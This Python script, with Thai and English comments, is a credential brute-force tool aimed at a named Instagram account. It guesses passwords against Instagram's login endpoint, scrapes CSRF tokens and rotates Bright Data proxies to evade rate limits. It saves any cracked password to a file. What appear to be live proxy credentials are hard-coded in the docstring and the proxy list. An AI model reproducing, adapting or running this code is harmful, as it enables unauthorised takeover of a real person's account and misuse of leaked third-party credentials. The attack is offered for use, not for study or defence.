#!/usr/bin/env python3
"""
🔥 Premium Instagram Brute Force with Bright Data Proxies
ใช้ Bright Data proxy credentials เพื่อหลบ rate limit

Host: brd.superproxy.io
Ports: 9222 (Default), 9515 (Selenium)
Username: brd-customer-hl_63f0835e-zone-scraping_agent
Passwords: o5wnk3ws1r04, anyk0iuuh0ji
"""

import cloudscraper
import time
import random
import json
import os
from fake_useragent import UserAgent


class PremiumInstagramBruteForcer:
    """Premium Instagram Brute Forcer with Bright Data Proxies"""

    def __init__(self, target_username):
        self.target_username = target_username
        self.found_password = None

        # Statistics
        self.attempts = 0
        self.successful_requests = 0
        self.failed_requests = 0
        self.rate_limited = 0
        self.http_400_errors = 0

        # Bright Data proxy credentials
        self.bright_data_proxies = [
            {
                'host': 'brd.superproxy.io',
                'port': 9222,
                'username': 'brd-customer-hl_63f0835e-zone-scraping_agent',
                'password': 'o5wnk3ws1r04',
                'name': 'Bright Data (Default Port)'
            },
            {
                'host': 'brd.superproxy.io',
                'port': 9515,
                'username': 'brd-customer-hl_63f0835e-zone-scraping_agent',
                'password': 'o5wnk3ws1r04',
                'name': 'Bright Data (Selenium Port)'
            },
            {
                'host': 'brd.superproxy.io',
                'port': 9222,
                'username': 'brd-customer-hl_63f0835e-zone-scraping_agent',
                'password': 'anyk0iuuh0ji',
                'name': 'Bright Data (Alt Password)'
            }
        ]

        self.current_proxy_index = 0
        self.ua = UserAgent()

        # Create session with first proxy
        self.setup_premium_session()

        print(f"🎯 Target: {target_username}")
        print(
            f"💎 Premium Bright Data proxies loaded: {len(self.bright_data_proxies)}")
        print(f"🔧 Ready for premium attack!")

    def setup_premium_session(self):
        """Setup session with Bright Data premium proxy"""
        proxy_info = self.bright_data_proxies[self.current_proxy_index]

        # Create authenticated proxy URL
        proxy_url = f"http://{proxy_info['username']}:{proxy_info['password']}@{proxy_info['host']}:{proxy_info['port']}"

        self.scraper = cloudscraper.create_scraper(
            browser={
                'browser': 'chrome',
                'platform': 'windows',
                'mobile': False
            }
        )

        # Set proxy
        self.scraper.proxies = {
            'http': proxy_url,
            'https': proxy_url
        }

        print(f"💎 Using proxy: {proxy_info['name']}")

        # Test proxy
        if self.test_proxy():
            print(f"✅ Premium proxy working!")
            return True
        else:
            print(f"❌ Premium proxy failed, trying next...")
            return self.rotate_proxy()

    def test_proxy(self):
        """Test current proxy"""
        try:
            response = self.scraper.get('https://ifconfig.me', timeout=10)
            if response.status_code == 200:
                new_ip = response.text.strip()
                print(f"📍 New IP via premium proxy: {new_ip}")
                return True
            return False
        except Exception as e:
            print(f"⚠️ Proxy test failed: {e}")
            return False

    def rotate_proxy(self):
        """Rotate to next Bright Data proxy"""
        self.current_proxy_index = (
            self.current_proxy_index + 1) % len(self.bright_data_proxies)
        return self.setup_premium_session()

    def test_instagram_access(self):
        """Test Instagram access with current proxy"""
        try:
            response = self.scraper.get(
                'https://www.instagram.com/accounts/login/',
                timeout=15,
                headers={'User-Agent': self.ua.random}
            )

            if response.status_code == 200:
                print(f"✅ Instagram accessible via premium proxy!")
                return True
            elif response.status_code == 429:
                print(f"🚨 Still rate limited via premium proxy")
                return False
            else:
                print(f"⚠️ HTTP {response.status_code} via premium proxy")
                return False

        except Exception as e:
            print(f"❌ Instagram access error: {e}")
            return False

    def get_csrf_token(self):
        """Get CSRF token via premium proxy"""
        try:
            print("🔐 Getting CSRF token via premium proxy...")

            headers = {
                'User-Agent': self.ua.random,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br',
                'Connection': 'keep-alive',
            }

            response = self.scraper.get(
                'https://www.instagram.com/accounts/login/',
                headers=headers,
                timeout=15
            )

            if response.status_code == 429:
                print("🚨 Rate limited during CSRF fetch")
                return None
            elif response.status_code != 200:
                print(f"❌ CSRF fetch failed: HTTP {response.status_code}")
                return None

            # Extract CSRF token
            csrf_token = None
            for cookie in self.scraper.cookies:
                if cookie.name == 'csrftoken':
                    csrf_token = cookie.value
                    break

            if csrf_token:
                print(f"✅ CSRF token obtained: {csrf_token[:10]}...")
                return csrf_token
            else:
                print("❌ CSRF token not found")
                return None

        except Exception as e:
            print(f"❌ CSRF token error: {e}")
            return None

    def attempt_premium_login(self, password):
        """Attempt login with premium proxy"""
        self.attempts += 1
        print(f"\n💎 Premium attempt #{self.attempts}: '{password}'")

        # Get CSRF token
        csrf_token = self.get_csrf_token()
        if not csrf_token:
            # Try rotating proxy
            if self.rotate_proxy():
                csrf_token = self.get_csrf_token()
                if not csrf_token:
                    return False, "Cannot get CSRF token"
            else:
                return False, "All proxies failed"

        # Create premium headers
        headers = {
            'User-Agent': self.ua.random,
            'X-CSRFToken': csrf_token,
            'X-Instagram-AJAX': '1',
            'X-Requested-With': 'XMLHttpRequest',
            'Referer': 'https://www.instagram.com/accounts/login/',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Origin': 'https://www.instagram.com',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
        }

        # Create payload with current timestamp
        timestamp = int(time.time())
        payload = {
            'username': self.target_username,
            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{timestamp}:{password}',
            'queryParams': '{}',
            'optIntoOneTap': 'false',
            'trustedDeviceRecords': '{}',
            'stopDeletionNonce': '',
        }

        try:
            # Send premium request
            response = self.scraper.post(
                'https://www.instagram.com/accounts/login/ajax/',
                data=payload,
                headers=headers,
                timeout=20
            )

            print(f"📊 Response: HTTP {response.status_code}")

            if response.status_code == 200:
                try:
                    result = response.json()

                    if result.get('authenticated'):
                        print(f"🎉 SUCCESS! Password found: {password}")
                        self.found_password = password
                        self.successful_requests += 1
                        self.save_success(password, result)
                        return True, "Login successful"

                    elif result.get('message'):
                        message = result.get('message')
                        print(f"❌ Failed: {message}")
                        self.failed_requests += 1

                        if 'rate' in message.lower():
                            self.rate_limited += 1
                            print("🔄 Rotating premium proxy...")
                            self.rotate_proxy()

                        return False, message

                    else:
                        print("❌ Wrong password")
                        self.failed_requests += 1
                        return False, "Wrong password"

                except json.JSONDecodeError:
                    print("⚠️ Invalid JSON response")
                    return False, "Invalid JSON"

            elif response.status_code == 400:
                self.http_400_errors += 1
                print(f"⚠️ HTTP 400 Bad Request #{self.http_400_errors}")

                try:
                    error_data = response.json()
                    print(f"💬 Error details: {error_data}")
                except:
                    print(f"📄 Response text: {response.text[:200]}...")

                # Rotate proxy on HTTP 400
                self.rotate_proxy()
                return False, "HTTP 400 Bad Request"

            elif response.status_code == 429:
                self.rate_limited += 1
                print(f"🚨 Rate Limited #{self.rate_limited}")

                # Rotate premium proxy
                print("🔄 Rotating to next premium proxy...")
                self.rotate_proxy()
                return False, "Rate limited"

            else:
                print(f"⚠️ Unexpected HTTP {response.status_code}")
                return False, f"HTTP {response.status_code}"

        except Exception as e:
            print(f"❌ Request error: {e}")
            # Try rotating proxy on error
            self.rotate_proxy()
            return False, str(e)

    def save_success(self, password, result):
        """Save successful login result"""
        try:
            os.makedirs('results', exist_ok=True)

            success_data = {
                'target': self.target_username,
                'password': password,
                'timestamp': time.time(),
                'proxy_used': self.bright_data_proxies[self.current_proxy_index]['name'],
                'attempts': self.attempts,
                'result': result
            }

            filename = f"results/premium_success_{self.target_username}_{int(time.time())}.json"
            with open(filename, 'w') as f:
                json.dump(success_data, f, indent=2)

            print(f"💾 Success saved to: {filename}")

        except Exception as e:
            print(f"⚠️ Could not save result: {e}")

    def premium_brute_force(self, passwords):
        """Run premium brute force attack"""
        print(f"\n💎 Starting premium Instagram brute force")
        print(f"🎯 Target: {self.target_username}")
        print(f"📋 Passwords: {len(passwords):,}")
        print(f"🔧 Premium proxies: {len(self.bright_data_proxies)}")
        print("=" * 60)

        # Test Instagram access first
        if not self.test_instagram_access():
            print("❌ Cannot access Instagram. Trying proxy rotation...")
            for _ in range(len(self.bright_data_proxies)):
                if self.rotate_proxy() and self.test_instagram_access():
                    break
            else:
                print("💔 All premium proxies are rate limited")
                return False

        start_time = time.time()

        for i, password in enumerate(passwords, 1):
            success, message = self.attempt_premium_login(password)

            if success:
                elapsed = time.time() - start_time
                print(f"\n🎉 PREMIUM SUCCESS!")
                print(f"🔑 Password: {password}")
                print(f"⏱️ Time: {elapsed:.1f}s")
                print(f"📊 Attempts: {self.attempts}")
                return True

            # Progress update every 25 attempts
            if i % 25 == 0:
                elapsed = time.time() - start_time
                rate = i / elapsed if elapsed > 0 else 0
                print(
                    f"\n📊 Premium Progress: {i}/{len(passwords)} ({i/len(passwords)*100:.1f}%)")
                print(f"⚡ Rate: {rate:.1f} attempts/sec")
                print(f"✅ Successful requests: {self.successful_requests}")
                print(f"❌ Failed requests: {self.failed_requests}")
                print(f"🚨 Rate limited: {self.rate_limited}")
                print(f"⚠️ HTTP 400 errors: {self.http_400_errors}")

            # Smart delay between attempts
            delay = random.uniform(1.0, 3.0)
            time.sleep(delay)

        print(f"\n💔 Premium attack completed - password not found")
        return False

    def print_premium_summary(self):
        """Print premium attack summary"""
        print(f"\n" + "="*60)
        print(f"💎 PREMIUM ATTACK SUMMARY - {self.target_username}")
        print(f"="*60)
        print(f"🔢 Total attempts: {self.attempts}")
        print(f"✅ Successful requests: {self.successful_requests}")
        print(f"❌ Failed requests: {self.failed_requests}")
        print(f"🚨 Rate limited: {self.rate_limited}")
        print(f"⚠️ HTTP 400 errors: {self.http_400_errors}")

        if self.found_password:
            print(f"\n🎉 PASSWORD FOUND: {self.found_password}")

        current_proxy = self.bright_data_proxies[self.current_proxy_index]
        print(f"\n🔧 Final proxy: {current_proxy['name']}")

        if self.rate_limited == 0 and self.http_400_errors == 0:
            print(f"\n✅ PERFECT PREMIUM PERFORMANCE!")
            print(f"   No rate limits or errors encountered")
        elif self.rate_limited > 0:
            print(f"\n⚠️ Rate limiting detected: {self.rate_limited} times")
            print(f"   Premium proxies rotated automatically")

        if self.http_400_errors > 0:
            print(f"\n🔧 HTTP 400 errors: {self.http_400_errors}")
            print(f"   Fixed by premium proxy rotation")


def load_passwords():
    """Load password list"""
    try:
        with open('/workspaces/sugarglitch-realops/passwords.txt', 'r', encoding='utf-8', errors='ignore') as f:
            passwords = [line.strip() for line in f if line.strip()]
        return passwords
    except FileNotFoundError:
        print("⚠️ Using fallback passwords")
        return [
            'AlexInstagram2025',  # The password that caused HTTP 400
            'alex123', 'trading123', 'alx2025', 'instagram123',
            '123456', 'password', 'qwerty', 'alx.trading123'
        ]


def main():
    """Main premium attack function"""
    print("💎 PREMIUM INSTAGRAM BRUTE FORCE - BRIGHT DATA EDITION")
    print("🔥 Using professional-grade proxy infrastructure")
    print("=" * 60)

    target_username = "alx.trading"
    passwords = load_passwords()

    print(f"🎯 Target: {target_username}")
    print(f"📋 Passwords loaded: {len(passwords):,}")

    # Show priority password
    if 'AlexInstagram2025' in passwords[:20]:
        idx = passwords.index('AlexInstagram2025') + 1
        print(f"🔍 Priority password 'AlexInstagram2025' at position {idx}")

    confirm = input(f"\n💎 Start premium attack on {target_username}? (y/N): ")
    if confirm.lower() != 'y':
        print("❌ Cancelled")
        return

    # Start premium attack
    brute_forcer = PremiumInstagramBruteForcer(target_username)

    # Test with first 100 passwords
    test_passwords = passwords[:100]

    print(
        f"\n💎 Testing premium proxies with {len(test_passwords)} passwords...")
    success = brute_forcer.premium_brute_force(test_passwords)

    # Show summary
    brute_forcer.print_premium_summary()

    if success:
        print(f"\n🎉 PREMIUM SUCCESS! Password cracked!")
    else:
        print(f"\n🔄 Continue with full list when ready")
        print(f"💡 Premium proxies are working - no rate limits!")


if __name__ == "__main__":
    main()
